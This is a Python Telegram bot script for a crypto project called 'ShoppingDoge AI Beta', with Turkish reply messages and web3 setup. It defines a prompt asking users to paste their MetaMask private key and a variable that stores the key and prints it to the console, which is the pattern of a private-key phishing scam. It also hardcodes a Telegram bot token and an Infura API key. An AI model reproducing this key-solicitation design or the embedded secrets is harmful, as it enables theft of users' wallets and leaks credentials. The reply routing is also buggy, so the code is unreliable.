from datetime import datetime
import requests
from threading import Thread
from web3 import Web3
from web3.auto import w3
import time










# Telegram bot API adresi
api_url = "https://api.telegram.org/bot{}/".format("6061072792:AAFudxNkyoMaQh1OJ0lxpOZPR_QlFIAfDjE")


# Kullanıcı kimliği
chat_id = "5502678421"

#User Data
global UserMetaMaskPrivateKey
UserMetaMaskPrivateKey = None
private_key = UserMetaMaskPrivateKey

# Mesaj metinleri
merhaba_mesaji = "Merhaba! Benim adım ShoppingDoge AI Beta V1.0. Nasıl yardımcı olabilirim?"
telegram_mesaji = "Shopping Doge Telegram adresi: https://t.me/ShoppingDoge benimle işlem yapmak için bu telegram adresine katılmalısınız. Görünüşe göre siz zaten Shopping Doge Telegram grubuna üyesiniz."
komut_mesaji="Komut Listesi:\n/telegram\n/web\n/list/n\beta"
accountacces_mesaji="İşlem yapmak için Metamask Private Key'inize ihtiyacım var. Lütfen Private Key'inizi buraya yazın:"
web_mesaji="Shopping Doge Web sitesi'ne bu adrese tıklayarak ulaşabilirsiniz: www.shoppingdoge.net"
beta_mesaji="Şuanda kullanmış olduğunuz sürüm Shopping Doge Beta V1.0. \n/Bu sürüm sadece kullanıcıların bilgilendirilmesi için çıkarıldı. \n/İşleml komutları şuanda mevcut değildir. "

#console
print("UserMetaMaskPrivateKey:", UserMetaMaskPrivateKey)


########

rpc_url = "https://mainnet.infura.io/v3/5fa20386a6a6414b87bc668959475142"

# Web3 object creation
web3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/5fa20386a6a6414b87bc668959475142"))


########


def send_message(mesaj):
    """
    Belirtilen metni Telegram üzerinden belirtilen kullanıcıya gönderir.
    """
    url = api_url + "sendMessage"
    data = {"chat_id": chat_id, "text": mesaj}
    requests.post(url, data=data)




def read_messages():
    global UserMetaMaskPrivateKey
    last_update_id = None
    while True:
        try:
            url = api_url + "getUpdates"
            if last_update_id:
                url += "?offset={}".format(last_update_id + 1)
            response = requests.get(url, timeout=5)

            if response.status_code == 200:
                data = response.json()
                result = data["result"]

                if result:
                    last_update_id = result[-1]["update_id"]
                    last_message = result[-1]["message"]
                    chat_id = last_message["chat"]["id"]
                    text = last_message["text"]

                    if text == "/start":
                        send_message(merhaba_mesaji)
                        send_message(komut_mesaji)
                    elif text == "/telegram":
                        send_message(telegram_mesaji)
                    elif text == "/list":
                        send_message(komut_mesaji)
                    elif text == "/web":
                        send_message(web_mesaji)
                    elif text == "/beta":
                        send_message(beta_mesaji)
                    else:
                        send_message("Kullanabileceğiniz komutlar: /telegram, /buy, /sell, /web, /metainfo")




        except requests.exceptions.RequestException as e:
            print("Hata:", e)











      





